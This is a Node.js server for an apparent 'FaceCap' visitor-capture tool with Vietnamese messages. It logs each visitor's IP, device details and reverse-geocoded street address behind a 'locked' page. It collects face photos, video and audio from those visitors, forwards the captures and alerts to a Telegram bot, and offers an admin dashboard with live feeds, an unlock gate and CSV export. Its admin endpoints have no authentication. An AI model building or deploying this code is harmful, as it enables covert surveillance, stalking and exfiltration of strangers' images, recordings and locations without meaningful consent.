const express = require('express');
const multer = require('multer');
const cron = require('node-cron');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');
const { v4: uuidv4 } = require('uuid');
const WebSocket = require('ws');

const app = express();
const PORT = 3000;

// ============================================================
// DIRECTORIES
// ============================================================
const uploadsDir = path.join(__dirname, 'uploads');
const videosDir  = path.join(__dirname, 'uploads', 'videos');
const audiosDir  = path.join(__dirname, 'uploads', 'audios');
const dataDir    = path.join(__dirname, 'data');

[uploadsDir, videosDir, audiosDir, dataDir].forEach(d => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

// ============================================================
// CONFIG (persistent JSON)
// ============================================================
const configPath = path.join(dataDir, 'config.json');
function loadConfig() {
  if (!fs.existsSync(configPath)) {
    const defaults = {
      pin: '872008',
      expireHours: 24,
      telegramToken: '',
      telegramChatId: '',
      telegramEnabled: false,
      alertSound: true
    };
    fs.writeFileSync(configPath, JSON.stringify(defaults, null, 2));
    return defaults;
  }
  return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}
function saveConfig(cfg) {
  fs.writeFileSync(configPath, JSON.stringify(cfg, null, 2));
}
let config = loadConfig();

// ============================================================
// SQLITE — Sessions & Visitor Log
// ============================================================
let db;
try {
  const Database = require('better-sqlite3');
  db = new Database(path.join(dataDir, 'facecap.db'));
  db.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
      sessionId TEXT PRIMARY KEY,
      locked INTEGER DEFAULT 1,
      unlockedAt TEXT,
      ip TEXT,
      userAgent TEXT,
      visitedAt TEXT,
      latitude REAL,
      longitude REAL,
      address TEXT,
      platform TEXT,
      screenW INTEGER,
      screenH INTEGER,
      language TEXT,
      timezone TEXT
    );
    CREATE TABLE IF NOT EXISTS visitor_log (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      sessionId TEXT,
      event TEXT,
      detail TEXT,
      ts TEXT DEFAULT (datetime('now'))
    );
  `);
  console.log('✅ SQLite database ready');
} catch (e) {
  console.warn('⚠️  better-sqlite3 not available, using in-memory store:', e.message);
  db = null;
}

// ============================================================
// IN-MEMORY SESSION STORE (fallback or primary for locked state)
// ============================================================
const sessionStore = new Map();

// Load existing sessions from SQLite into memory
if (db) {
  try {
    const rows = db.prepare('SELECT * FROM sessions').all();
    rows.forEach(row => {
      sessionStore.set(row.sessionId, {
        locked: row.locked === 1,
        unlockedAt: row.unlockedAt,
        ip: row.ip,
        userAgent: row.userAgent,
        visitedAt: row.visitedAt,
        location: row.latitude ? { latitude: row.latitude, longitude: row.longitude } : null,
        address: row.address,
        platform: row.platform,
        screenW: row.screenW,
        screenH: row.screenH,
        language: row.language,
        timezone: row.timezone
      });
    });
    console.log(`✅ Loaded ${rows.length} sessions from DB`);
  } catch (e) {
    console.warn('Could not load sessions from DB:', e.message);
  }
}

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadsDir));
app.use('/uploads/videos', express.static(videosDir));
app.use('/uploads/audios', express.static(audiosDir));

// ============================================================
// HTTP SERVER + WEBSOCKET
// ============================================================
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

function broadcast(type, data) {
  const msg = JSON.stringify({ type, data, ts: new Date().toISOString() });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(msg);
    }
  });
}

wss.on('connection', (ws) => {
  console.log(`[WS] Admin connected (total: ${wss.clients.size})`);
  ws.send(JSON.stringify({ type: 'connected', data: { message: 'WebSocket OK' } }));
  ws.on('close', () => console.log(`[WS] Admin disconnected`));
});

// ============================================================
// HELPER: Reverse Geocode
// ============================================================
function reverseGeocode(latitude, longitude) {
  return new Promise((resolve) => {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
    https.get(url, { headers: { 'User-Agent': 'FaceCap-Server' } }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const result = JSON.parse(data);
          const address = result.address || {};
          const houseNum = address.house_number ? `${address.house_number} ` : '';
          const street = address.road || address.street || address.residential || 'Không xác định';
          const ward = address.suburb || address.neighbourhood || '';
          const district = address.county || address.city_district || '';
          const fullAddress = `${houseNum}${street}${ward ? ', ' + ward : ''}${district ? ', ' + district : ''}`;
          resolve(fullAddress.trim());
        } catch (e) {
          resolve('Không xác định địa chỉ');
        }
      });
    }).on('error', () => resolve('Lỗi lấy địa chỉ'));
  });
}

// ============================================================
// HELPER: Telegram Bot
// ============================================================
async function sendTelegramMessage(text) {
  if (!config.telegramEnabled || !config.telegramToken || !config.telegramChatId) return;
  try {
    const fetch = require('node-fetch');
    await fetch(`https://api.telegram.org/bot${config.telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.telegramChatId,
        text,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.warn('Telegram sendMessage error:', e.message);
  }
}

async function sendTelegramPhoto(photoPath, caption) {
  if (!config.telegramEnabled || !config.telegramToken || !config.telegramChatId) return;
  if (!fs.existsSync(photoPath)) return;
  try {
    const fetch = require('node-fetch');
    const FormData = require('node-fetch').FormData || null;
    // Use multipart form for photo
    const fileStream = fs.createReadStream(photoPath);
    const boundary = '----FormBoundary' + Math.random().toString(36).slice(2);
    const fileBuffer = fs.readFileSync(photoPath);
    // Build multipart manually
    const CRLF = '\r\n';
    const metaPart = `--${boundary}${CRLF}Content-Disposition: form-data; name="chat_id"${CRLF}${CRLF}${config.telegramChatId}${CRLF}`;
    const captionPart = `--${boundary}${CRLF}Content-Disposition: form-data; name="caption"${CRLF}${CRLF}${caption}${CRLF}`;
    const photoPart = `--${boundary}${CRLF}Content-Disposition: form-data; name="photo"; filename="capture.jpg"${CRLF}Content-Type: image/jpeg${CRLF}${CRLF}`;
    const endPart = `${CRLF}--${boundary}--${CRLF}`;
    const bodyBuffer = Buffer.concat([
      Buffer.from(metaPart),
      Buffer.from(captionPart),
      Buffer.from(photoPart),
      fileBuffer,
      Buffer.from(endPart)
    ]);
    await fetch(`https://api.telegram.org/bot${config.telegramToken}/sendPhoto`, {
      method: 'POST',
      headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Content-Length': bodyBuffer.length
      },
      body: bodyBuffer
    });
  } catch (e) {
    console.warn('Telegram sendPhoto error:', e.message);
    // Fallback: just send text
    await sendTelegramMessage(caption);
  }
}

// ============================================================
// API ROUTES
// ============================================================

// ---------- Config ----------
app.get('/api/config', (req, res) => {
  // Don't expose full token
  const safe = { ...config, telegramToken: config.telegramToken ? '***' + config.telegramToken.slice(-4) : '' };
  res.json(safe);
});

app.post('/api/config', (req, res) => {
  const { pin, expireHours, telegramToken, telegramChatId, telegramEnabled, alertSound } = req.body;
  if (pin !== undefined) config.pin = String(pin);
  if (expireHours !== undefined) config.expireHours = Number(expireHours);
  if (telegramToken !== undefined && telegramToken !== '***' + (config.telegramToken || '').slice(-4)) {
    config.telegramToken = String(telegramToken);
  }
  if (telegramChatId !== undefined) config.telegramChatId = String(telegramChatId);
  if (telegramEnabled !== undefined) config.telegramEnabled = Boolean(telegramEnabled);
  if (alertSound !== undefined) config.alertSound = Boolean(alertSound);
  saveConfig(config);
  res.json({ success: true });
});

app.post('/api/telegram/test', async (req, res) => {
  if (!config.telegramToken || !config.telegramChatId) {
    return res.json({ success: false, error: 'Chưa cấu hình Telegram' });
  }
  try {
    const fetch = require('node-fetch');
    const resp = await fetch(`https://api.telegram.org/bot${config.telegramToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.telegramChatId,
        text: '✅ <b>FaceCap</b> — Kết nối Telegram thành công!',
        parse_mode: 'HTML'
      })
    });
    const data = await resp.json();
    if (data.ok) res.json({ success: true });
    else res.json({ success: false, error: data.description });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

// ---------- Session Management ----------
app.post('/api/session/register', async (req, res) => {
  const sessionId = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const { location, platform, screenW, screenH, language, timezone } = req.body;

  let address = null;
  if (location && location.latitude && location.longitude) {
    address = await reverseGeocode(location.latitude, location.longitude);
  }

  const sessionData = {
    locked: true,
    unlockedAt: null,
    ip,
    userAgent,
    visitedAt: new Date().toISOString(),
    location: location || null,
    address,
    platform: platform || null,
    screenW: screenW || null,
    screenH: screenH || null,
    language: language || null,
    timezone: timezone || null
  };

  sessionStore.set(sessionId, sessionData);

  // Persist to SQLite
  if (db) {
    try {
      db.prepare(`INSERT OR REPLACE INTO sessions (sessionId,locked,ip,userAgent,visitedAt,latitude,longitude,address,platform,screenW,screenH,language,timezone)
        VALUES (?,1,?,?,?,?,?,?,?,?,?,?,?)`)
        .run(sessionId, ip, userAgent, sessionData.visitedAt,
          location?.latitude || null, location?.longitude || null, address,
          platform || null, screenW || null, screenH || null, language || null, timezone || null);
      db.prepare('INSERT INTO visitor_log (sessionId,event,detail) VALUES (?,?,?)')
        .run(sessionId, 'visit', ip);
    } catch (e) { console.warn('DB insert error:', e.message); }
  }

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔒 Visitor mới: ${sessionId} - IP: ${ip}${address ? ` - ${address}` : ''}`);

  // Broadcast to admin
  broadcast('new_visitor', {
    sessionId,
    ip,
    address,
    visitedAt: sessionData.visitedAt,
    platform,
    userAgent
  });

  // Telegram alert
  const tgText = `🔒 <b>Visitor mới!</b>\n🌐 IP: <code>${ip}</code>${address ? `\n📍 ${address}` : ''}${platform ? `\n📱 ${platform}` : ''}\n🕐 ${new Date().toLocaleString('vi-VN')}`;
  sendTelegramMessage(tgText).catch(() => {});

  res.json({ success: true, sessionId });
});

app.get('/api/session/status/:sessionId', (req, res) => {
  const session = sessionStore.get(req.params.sessionId);
  if (!session) return res.json({ locked: true });
  res.json({ locked: session.locked });
});

app.get('/api/sessions', (req, res) => {
  const list = [];
  sessionStore.forEach((data, sessionId) => {
    list.push({ sessionId, ...data });
  });
  list.sort((a, b) => new Date(b.visitedAt) - new Date(a.visitedAt));
  res.json(list);
});

app.post('/api/session/unlock/:sessionId', (req, res) => {
  const session = sessionStore.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session không tồn tại' });
  session.locked = false;
  session.unlockedAt = new Date().toISOString();
  if (db) {
    try {
      db.prepare('UPDATE sessions SET locked=0, unlockedAt=? WHERE sessionId=?')
        .run(session.unlockedAt, req.params.sessionId);
    } catch (e) {}
  }
  broadcast('session_unlocked', { sessionId: req.params.sessionId });
  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔓 Đã mở khóa: ${req.params.sessionId}`);
  res.json({ success: true });
});

app.post('/api/session/unlock-all', (req, res) => {
  const now = new Date().toISOString();
  sessionStore.forEach((data, id) => {
    data.locked = false;
    data.unlockedAt = now;
  });
  if (db) {
    try { db.prepare('UPDATE sessions SET locked=0, unlockedAt=?').run(now); } catch (e) {}
  }
  broadcast('all_unlocked', {});
  console.log(`[${new Date().toLocaleString('vi-VN')}] 🔓 Đã mở khóa TẤT CẢ`);
  res.json({ success: true });
});

app.post('/api/session/lock/:sessionId', (req, res) => {
  const session = sessionStore.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session không tồn tại' });
  session.locked = true;
  session.unlockedAt = null;
  if (db) {
    try {
      db.prepare('UPDATE sessions SET locked=1, unlockedAt=NULL WHERE sessionId=?')
        .run(req.params.sessionId);
    } catch (e) {}
  }
  broadcast('session_locked', { sessionId: req.params.sessionId });
  res.json({ success: true });
});

app.delete('/api/session/:sessionId', (req, res) => {
  sessionStore.delete(req.params.sessionId);
  if (db) {
    try { db.prepare('DELETE FROM sessions WHERE sessionId=?').run(req.params.sessionId); } catch (e) {}
  }
  res.json({ success: true });
});

// ---------- Photo Upload ----------
const photoUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => cb(null, `face_${Date.now()}.jpg`)
  }),
  limits: { fileSize: 10 * 1024 * 1024 }
});

app.post('/api/upload', photoUpload.single('photo'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Không có file' });

  let location = null, address = null;
  if (req.body.location) {
    try {
      location = JSON.parse(req.body.location);
      address = await reverseGeocode(location.latitude, location.longitude);
    } catch (e) {}
  }

  const expireMs = (config.expireHours || 24) * 60 * 60 * 1000;
  const photoData = {
    filename: req.file.filename,
    originalname: req.file.originalname,
    size: req.file.size,
    uploadedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + expireMs).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    userAgent: req.headers['user-agent'],
    location,
    address,
    sessionId: req.body.sessionId || null
  };

  const metaFile = path.join(uploadsDir, `${req.file.filename}.json`);
  fs.writeFileSync(metaFile, JSON.stringify(photoData, null, 2));

  console.log(`[${new Date().toLocaleString('vi-VN')}] 📸 Ảnh mới: ${req.file.filename}`);

  broadcast('new_photo', {
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`,
    ip: photoData.ip,
    address,
    uploadedAt: photoData.uploadedAt,
    size: photoData.size
  });

  // Telegram: gửi ảnh
  const caption = `📸 <b>Ảnh mới!</b>\n🌐 IP: <code>${photoData.ip}</code>${address ? `\n📍 ${address}` : ''}\n🕐 ${new Date().toLocaleString('vi-VN')}`;
  sendTelegramPhoto(path.join(uploadsDir, req.file.filename), caption).catch(() => {});

  res.json({ success: true, filename: req.file.filename });
});

// ---------- Photos List ----------
app.get('/api/photos', (req, res) => {
  const files = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg'));
  const photos = files.map(filename => {
    const metaFile = path.join(uploadsDir, `${filename}.json`);
    let meta = { filename, uploadedAt: new Date().toISOString(), ip: 'Unknown' };
    if (fs.existsSync(metaFile)) {
      meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
    }
    return { ...meta, url: `/uploads/${filename}`, timeLeft: Math.max(0, new Date(meta.expiresAt) - Date.now()) };
  });
  photos.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  res.json(photos);
});

app.delete('/api/photos/:filename', (req, res) => {
  const filename = req.params.filename;
  const imgPath = path.join(uploadsDir, filename);
  const metaPath = path.join(uploadsDir, `${filename}.json`);
  if (!fs.existsSync(imgPath)) return res.status(404).json({ error: 'Không tìm thấy ảnh' });
  fs.unlinkSync(imgPath);
  if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);
  console.log(`[${new Date().toLocaleString('vi-VN')}] 🗑️ Đã xóa: ${filename}`);
  res.json({ success: true });
});

// ---------- Bulk Delete ----------
app.post('/api/photos/bulk-delete', (req, res) => {
  const { filenames } = req.body;
  if (!Array.isArray(filenames)) return res.status(400).json({ error: 'Invalid' });
  let deleted = 0;
  filenames.forEach(filename => {
    const imgPath = path.join(uploadsDir, filename);
    const metaPath = path.join(uploadsDir, `${filename}.json`);
    if (fs.existsSync(imgPath)) { fs.unlinkSync(imgPath); deleted++; }
    if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);
  });
  res.json({ success: true, deleted });
});

app.post('/api/videos/bulk-delete', (req, res) => {
  const { filenames } = req.body;
  if (!Array.isArray(filenames)) return res.status(400).json({ error: 'Invalid' });
  let deleted = 0;
  filenames.forEach(filename => {
    const vidPath = path.join(videosDir, filename);
    const metaPath = path.join(videosDir, `${filename}.json`);
    if (fs.existsSync(vidPath)) { fs.unlinkSync(vidPath); deleted++; }
    if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);
    deleted++;
  });
  res.json({ success: true, deleted });
});

// ---------- Video Upload ----------
const videoUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, videosDir),
    filename: (req, file, cb) => {
      const ext = file.originalname.endsWith('.mp4') ? 'mp4' : 'webm';
      cb(null, `video_${Date.now()}.${ext}`);
    }
  }),
  limits: { fileSize: 150 * 1024 * 1024 }
});

app.post('/api/upload-video', videoUpload.single('video'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Không có file' });

  const expireMs = (config.expireHours || 24) * 60 * 60 * 1000;
  const videoData = {
    filename: req.file.filename,
    size: req.file.size,
    uploadedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + expireMs).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    userAgent: req.headers['user-agent'],
    sessionId: req.body.sessionId || null
  };

  const metaFile = path.join(videosDir, `${req.file.filename}.json`);
  fs.writeFileSync(metaFile, JSON.stringify(videoData, null, 2));

  console.log(`[${new Date().toLocaleString('vi-VN')}] 🎥 Video mới: ${req.file.filename} - ${(req.file.size/1024/1024).toFixed(2)}MB`);

  broadcast('new_video', {
    filename: req.file.filename,
    url: `/uploads/videos/${req.file.filename}`,
    ip: videoData.ip,
    uploadedAt: videoData.uploadedAt,
    size: videoData.size
  });

  sendTelegramMessage(`🎥 <b>Video mới!</b>\n🌐 IP: <code>${videoData.ip}</code>\n📦 ${(req.file.size/1024/1024).toFixed(2)} MB\n🕐 ${new Date().toLocaleString('vi-VN')}`).catch(() => {});

  res.json({ success: true, filename: req.file.filename });
});

// ---------- Audio Upload ----------
const audioUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, audiosDir),
    filename: (req, file, cb) => cb(null, `audio_${Date.now()}.webm`)
  }),
  limits: { fileSize: 50 * 1024 * 1024 }
});

app.post('/api/upload-audio', audioUpload.single('audio'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Không có file' });

  const expireMs = (config.expireHours || 24) * 60 * 60 * 1000;
  const audioData = {
    filename: req.file.filename,
    size: req.file.size,
    uploadedAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + expireMs).toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    sessionId: req.body.sessionId || null
  };

  fs.writeFileSync(path.join(audiosDir, `${req.file.filename}.json`), JSON.stringify(audioData, null, 2));
  broadcast('new_audio', { filename: req.file.filename, ip: audioData.ip, size: audioData.size });
  res.json({ success: true, filename: req.file.filename });
});

// ---------- Videos List ----------
app.get('/api/videos', (req, res) => {
  const files = fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4'));
  const videos = files.map(filename => {
    const metaFile = path.join(videosDir, `${filename}.json`);
    let meta = { filename, uploadedAt: new Date().toISOString(), ip: 'Unknown' };
    if (fs.existsSync(metaFile)) meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
    return { ...meta, url: `/uploads/videos/${filename}`, timeLeft: Math.max(0, new Date(meta.expiresAt || Date.now()) - Date.now()) };
  });
  videos.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  res.json(videos);
});

app.delete('/api/videos/:filename', (req, res) => {
  const filename = req.params.filename;
  const vidPath = path.join(videosDir, filename);
  const metaPath = path.join(videosDir, `${filename}.json`);
  if (!fs.existsSync(vidPath)) return res.status(404).json({ error: 'Không tìm thấy video' });
  fs.unlinkSync(vidPath);
  if (fs.existsSync(metaPath)) fs.unlinkSync(metaPath);
  res.json({ success: true });
});

// ---------- Audios List ----------
app.get('/api/audios', (req, res) => {
  const files = fs.readdirSync(audiosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp3'));
  const audios = files.map(filename => {
    const metaFile = path.join(audiosDir, `${filename}.json`);
    let meta = { filename, uploadedAt: new Date().toISOString(), ip: 'Unknown' };
    if (fs.existsSync(metaFile)) meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
    return { ...meta, url: `/uploads/audios/${filename}`, timeLeft: Math.max(0, new Date(meta.expiresAt || Date.now()) - Date.now()) };
  });
  audios.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
  res.json(audios);
});

app.delete('/api/audios/:filename', (req, res) => {
  const filename = req.params.filename;
  const p = path.join(audiosDir, filename);
  const mp = path.join(audiosDir, `${filename}.json`);
  if (!fs.existsSync(p)) return res.status(404).json({ error: 'Not found' });
  fs.unlinkSync(p);
  if (fs.existsSync(mp)) fs.unlinkSync(mp);
  res.json({ success: true });
});

// ---------- Stats ----------
app.get('/api/stats', (req, res) => {
  const photos = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg'));
  const videos = fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4'));
  const audios = fs.readdirSync(audiosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp3'));
  res.json({
    totalPhotos: photos.length,
    totalVideos: videos.length,
    totalAudios: audios.length,
    activeSessions: sessionStore.size
  });
});

// ---------- Chart Data ----------
app.get('/api/stats/chart', (req, res) => {
  const hours = {};
  const days = {};
  const deviceMap = { mobile: 0, desktop: 0, tablet: 0 };

  sessionStore.forEach((data) => {
    const d = new Date(data.visitedAt);
    const hourKey = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:00`;
    const dayKey = `${d.getDate()}/${d.getMonth()+1}`;
    hours[hourKey] = (hours[hourKey] || 0) + 1;
    days[dayKey] = (days[dayKey] || 0) + 1;

    // Device type from userAgent
    const ua = (data.userAgent || '').toLowerCase();
    if (/mobile|android|iphone/.test(ua)) deviceMap.mobile++;
    else if (/tablet|ipad/.test(ua)) deviceMap.tablet++;
    else deviceMap.desktop++;
  });

  // Last 24 hours
  const last24 = [];
  for (let i = 23; i >= 0; i--) {
    const t = new Date(Date.now() - i * 3600000);
    const key = `${t.getFullYear()}-${t.getMonth()+1}-${t.getDate()} ${t.getHours()}:00`;
    last24.push({ label: `${t.getHours()}:00`, count: hours[key] || 0 });
  }

  // Last 7 days
  const last7 = [];
  for (let i = 6; i >= 0; i--) {
    const t = new Date(Date.now() - i * 86400000);
    const key = `${t.getDate()}/${t.getMonth()+1}`;
    last7.push({ label: key, count: days[key] || 0 });
  }

  res.json({ last24, last7, devices: deviceMap });
});

// ---------- Export CSV ----------
app.get('/api/export/csv', (req, res) => {
  const rows = [['SessionID','IP','Địa chỉ','Thời gian','Platform','UserAgent','Locked']];
  sessionStore.forEach((data, sessionId) => {
    rows.push([
      sessionId,
      data.ip || '',
      data.address || '',
      data.visitedAt || '',
      data.platform || '',
      (data.userAgent || '').replace(/,/g, ';'),
      data.locked ? 'Có' : 'Không'
    ]);
  });
  const csv = rows.map(r => r.join(',')).join('\n');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="facecap_export_${Date.now()}.csv"`);
  res.send('\uFEFF' + csv); // BOM for Excel
});

// ============================================================
// CRON JOBS
// ============================================================
cron.schedule('*/10 * * * *', () => {
  let deletedPhotos = 0, deletedVideos = 0, deletedAudios = 0;

  fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg')).forEach(filename => {
    const metaFile = path.join(uploadsDir, `${filename}.json`);
    if (fs.existsSync(metaFile)) {
      const meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
      if (new Date() > new Date(meta.expiresAt)) {
        fs.unlinkSync(path.join(uploadsDir, filename));
        fs.unlinkSync(metaFile);
        deletedPhotos++;
      }
    }
  });

  fs.readdirSync(videosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp4')).forEach(filename => {
    const metaFile = path.join(videosDir, `${filename}.json`);
    if (fs.existsSync(metaFile)) {
      const meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
      if (new Date() > new Date(meta.expiresAt)) {
        fs.unlinkSync(path.join(videosDir, filename));
        fs.unlinkSync(metaFile);
        deletedVideos++;
      }
    }
  });

  fs.readdirSync(audiosDir).filter(f => f.endsWith('.webm') || f.endsWith('.mp3')).forEach(filename => {
    const metaFile = path.join(audiosDir, `${filename}.json`);
    if (fs.existsSync(metaFile)) {
      const meta = JSON.parse(fs.readFileSync(metaFile, 'utf-8'));
      if (new Date() > new Date(meta.expiresAt)) {
        fs.unlinkSync(path.join(audiosDir, filename));
        fs.unlinkSync(metaFile);
        deletedAudios++;
      }
    }
  });

  if (deletedPhotos + deletedVideos + deletedAudios > 0) {
    console.log(`[Auto-Delete] Xóa ${deletedPhotos} ảnh, ${deletedVideos} video, ${deletedAudios} audio hết hạn`);
  }
});

// Dọn session quá cũ (> 24h)
cron.schedule('0 * * * *', () => {
  const cutoff = Date.now() - 24 * 60 * 60 * 1000;
  sessionStore.forEach((data, id) => {
    if (new Date(data.visitedAt).getTime() < cutoff) {
      sessionStore.delete(id);
    }
  });
});

// ============================================================
// TỰ ĐỘNG PING CHỐNG NGỦ (RENDER.COM KEEP-ALIVE)
// ============================================================
app.get('/api/ping', (req, res) => {
  res.status(200).send('pong');
});

const APP_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL;
if (APP_URL) {
  setInterval(() => {
    fetch(`${APP_URL}/api/ping`)
      .then(res => {
        if (res.ok) console.log(`[Keep-Alive] Đã tự ping thành công tới ${APP_URL}`);
      })
      .catch(err => console.error(`[Keep-Alive] Lỗi khi ping: ${err.message}`));
  }, 14 * 60 * 1000); // 14 phút (Render tắt app sau 15p)
}

// ============================================================
// START
// ============================================================
server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.log(`⚠️  Port ${PORT} đang bị chiếm — đang tự kill process cũ...`);
    const { execSync } = require('child_process');
    try {
      // Windows: tìm PID đang dùng port rồi kill
      const result = execSync(`netstat -ano | findstr :${PORT}`).toString();
      const lines = result.trim().split('\n');
      const pids = new Set();
      lines.forEach(line => {
        const parts = line.trim().split(/\s+/);
        const pid = parts[parts.length - 1];
        if (pid && pid !== '0') pids.add(pid);
      });
      pids.forEach(pid => {
        try {
          execSync(`taskkill /F /PID ${pid}`);
          console.log(`✅ Đã kill PID ${pid}`);
        } catch (e) {}
      });
    } catch (e) {}

    // Thử lại sau 1 giây
    setTimeout(() => {
      server.listen(PORT, () => {
        console.log(`\n🚀 Server đang chạy tại: http://localhost:${PORT}`);
        console.log(`📸 Trang người dùng: http://localhost:${PORT}`);
        console.log(`🔐 Trang Admin:      http://localhost:${PORT}/admin.html`);
        console.log(`📁 Ảnh lưu tại:      ${uploadsDir}`);
        console.log(`🔌 WebSocket:        ws://localhost:${PORT}\n`);
      });
    }, 1000);
  } else {
    throw err;
  }
});

server.listen(PORT, () => {
  console.log(`\n🚀 Server đang chạy tại: http://localhost:${PORT}`);
  console.log(`📸 Trang người dùng: http://localhost:${PORT}`);
  console.log(`🔐 Trang Admin:      http://localhost:${PORT}/admin.html`);
  console.log(`📁 Ảnh lưu tại:      ${uploadsDir}`);
  console.log(`🔌 WebSocket:        ws://localhost:${PORT}\n`);
});
